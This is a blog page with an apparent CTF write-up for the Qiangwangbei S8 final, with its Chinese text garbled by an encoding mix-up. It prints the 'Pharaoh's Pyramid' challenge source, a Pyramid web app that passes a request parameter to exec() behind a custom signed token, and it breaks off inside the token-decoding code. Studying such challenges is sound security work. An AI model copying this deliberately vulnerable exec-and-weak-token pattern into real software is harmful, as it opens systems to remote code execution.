
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>å¼ºç½‘æ¯S8 Final | é›²æµã®Lowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdnæŒ‚æ‰çš„æ—¶å€™è¦å¯ä»¥å¼•ç”¨æœ¬åœ° -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- å¼•å…¥jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--æ”¹æˆäº†prismjsé«˜äº®-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- å¼•å…¥ä¸è’œå­-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- ä»£ç è¯­è¨€ -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- ä»£ç å—å¤åˆ¶ -->
<!-- å¼•å…¥clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- ä»£ç å—æ”¶ç¼© -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- ä»£ç å—æŠ˜è¡Œ -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="é›²æµã®Lowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- é¡µé¢ç‚¹å‡»ç‰¹æ•ˆ -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- æµè§ˆå™¨æ ‡é¢˜ -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- åŠ¨æ€èƒŒæ™¯ -->
    

    <!--æ–‡ç« ç›®å½•-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  ç›®å½•</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jeopardy"><span class="toc-number">2.</span> <span class="toc-text">Jeopardy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pharaoh%E2%80%99s-Pyramid"><span class="toc-number">2.1.</span> <span class="toc-text">Pharaohâ€™s Pyramid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9Apyramid%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text">æ³•äºŒï¼špyramidå†…å­˜é©¬</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezlogin"><span class="toc-number">2.2.</span> <span class="toc-text">ezlogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anniversary%EF%BC%880-Solved%EF%BC%89"><span class="toc-number">2.3.</span> <span class="toc-text">anniversaryï¼ˆ0 Solvedï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RW"><span class="toc-number">3.</span> <span class="toc-text">RW</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TS-%EF%BC%88Unsolved%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">TS++ï¼ˆUnsolvedï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%B8%E8%AE%B0%EF%BC%88to-be-continued%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">æ¸¸è®°ï¼ˆto be continuedï¼‰</span></a></li></ol>
    </div>
  

    <!--è¿”å›é¡¶éƒ¨-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="è¿”å›é¡¶éƒ¨">â†‘</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>ç¬¬ä¸€æ¬¡åŠ è½½æ–‡ç« å›¾ç‰‡å¯èƒ½ä¼šèŠ±è´¹è¾ƒé•¿æ—¶é—´</p>
                    <p>è¦ä¸æŒ‚ä¸ªæ¢¯å­è¯•è¯•ï¼Ÿï¼ˆx</p>
                    <p>åŠ è½½è¿‡æ…¢è¯·å¼€å¯ç¼“å­˜&ensp;æµè§ˆå™¨é»˜è®¤å¼€å¯</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>é›²æµã®LOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;é›²æµã®LOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>å¼ºç½‘æ¯S8 Final</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/12/5
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                çº¿ä¸‹èµ›
            </a>
        </span>
        
        
        <!--æ–‡ç« å­—æ•°ç»Ÿè®¡-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  å­—æ•°ç»Ÿè®¡: </span>
        <!-- å®‰è£…æ’ä»¶npm install hexo-wordcount --save -->
        <span class="post-count">2.8kå­—</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  é˜…è¯»æ—¶é•¿: </span>
        <span class="post-count">14åˆ†</span>
      </span>
    </span>
    
    <!--ä¸è’œå­ç»Ÿè®¡è®¿é—®æ•°-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    æ€»æ–‡ç« é˜…è¯»é‡ï¼š<span id="busuanzi_value_page_pv"></span>æ¬¡
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æˆ‘å¤§æ¦‚ä¸€è¾ˆå­éƒ½å¿˜ä¸äº†å¼ºç½‘æ¯äº†å§</p>
<span id="more"></span>

<p>å‚è€ƒï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16044">å¼ºç½‘æ¯S8å†³èµ›RWèµ›é“-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/3974">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-å¼ºç½‘æ¯S8å†³èµ›Pyramidæ¡†æ¶ä¸‹å†…å­˜é©¬çš„åˆ†ææ„é€ åŠRSåŠ å¯†ç­¾åä¼ªé€ </a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16019">S8å¼ºç½‘æ¯ ez_loginè¯¦è§£-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206181319593.png" alt="image-20241206181319593"></p>
<p>æ²¡æœ‰çˆ†é›¶ï¼Œä¸æ˜¯å«åº•ï¼Œä½œä¸ºä¸€ä¸ªå†å²çŸ­æš‚çš„åŒéæ ¡é˜Ÿå·²ç»è¿œè¶…é¢„æœŸäº†ï¼ˆç¬‘ï¼‰</p>
<hr>
<h1 id="Jeopardy"><a href="#Jeopardy" class="headerlink" title="Jeopardy"></a>Jeopardy</h1><h2 id="Pharaohâ€™s-Pyramid"><a href="#Pharaohâ€™s-Pyramid" class="headerlink" title="Pharaohâ€™s Pyramid"></a>Pharaohâ€™s Pyramid</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> wsgiref<span class="token punctuation">.</span>simple_server <span class="token keyword">import</span> make_server
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>config <span class="token keyword">import</span> Configurator
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>events <span class="token keyword">import</span> NewResponse
<span class="token keyword">from</span> pyramid<span class="token punctuation">.</span>response <span class="token keyword">import</span> Response
<span class="token keyword">import</span> util

users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>
default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>


<span class="token keyword">def</span> <span class="token function">register_api</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Not Allowed!"</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input username &amp; password'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"500 Internal Server"</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">&#125;</span>
    users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Here is your token: "</span><span class="token operator">+</span> token<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">register_front</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">front_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>util<span class="token punctuation">.</span>read_html<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">system_test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>
        token <span class="token operator">=</span> request<span class="token punctuation">.</span>params<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span>
        data <span class="token operator">=</span> util<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
            username <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token keyword">if</span> username <span class="token keyword">in</span> super_user<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome super_user!"</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Unauthorized'</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token string">"401 Unauthorized"</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">'Please Input code &amp; token'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Success!"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> Configurator<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> config<span class="token punctuation">:</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_front'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'register_api'</span><span class="token punctuation">,</span> <span class="token string">'/api/register'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'system_test'</span><span class="token punctuation">,</span> <span class="token string">'/api/test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_route<span class="token punctuation">(</span><span class="token string">'front_test'</span><span class="token punctuation">,</span> <span class="token string">'/test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>system_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'system_test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>front_test<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'front_test'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_api<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_api'</span><span class="token punctuation">)</span>
        config<span class="token punctuation">.</span>add_view<span class="token punctuation">(</span>register_front<span class="token punctuation">,</span> route_name<span class="token operator">=</span><span class="token string">'register_front'</span><span class="token punctuation">)</span>
        app <span class="token operator">=</span> config<span class="token punctuation">.</span>make_wsgi_app<span class="token punctuation">(</span><span class="token punctuation">)</span>

    server <span class="token operator">=</span> make_server<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">6543</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span>
    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å®¡è®¡ä»£ç ï¼Œåªéœ€è¦ä»¥ admin ç™»å½•å°±èƒ½ rce</p>
<p>è§‚å¯Ÿæ³¨å†Œè·å–jwtçš„éƒ¨åˆ†ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
super_user <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span>
default_alg <span class="token operator">=</span> <span class="token string">"RS"</span>

users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
token <span class="token operator">=</span> util<span class="token punctuation">.</span>data_encode<span class="token punctuation">(</span>data<span class="token punctuation">,</span> default_alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è·Ÿè¿›</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_encode</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> alg <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'HS'</span><span class="token punctuation">,</span> <span class="token string">'RS'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> <span class="token string">"Algorithm must be HS or RS!"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        private_key<span class="token punctuation">,</span> public_key <span class="token operator">=</span> generate_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>
            signature <span class="token operator">=</span> sign_data<span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            data_bytes <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>  <span class="token comment"># data</span>
            encoded_data2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span>  <span class="token comment"># signature</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>encoded_data2<span class="token punctuation">)</span>
            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>
            encoded_data4 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span>  <span class="token comment"># public_key</span>
            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data4<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> encoded_data
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
            data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
            hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
            hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
            signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>inputdata<span class="token punctuation">)</span>  <span class="token comment"># data</span>
            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>
            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> encoded_data
        
<span class="token keyword">def</span> <span class="token function">sign_data</span><span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>
    <span class="token comment"># å°†JSONæ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
    data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    signature <span class="token operator">=</span> pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>hash_obj<span class="token punctuation">)</span>
    <span class="token keyword">return</span> signature<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åæ˜¯decode</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_decode</span><span class="token punctuation">(</span>encode_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        all_data <span class="token operator">=</span> encode_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>
        sig_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>
        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>
        alg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> secret
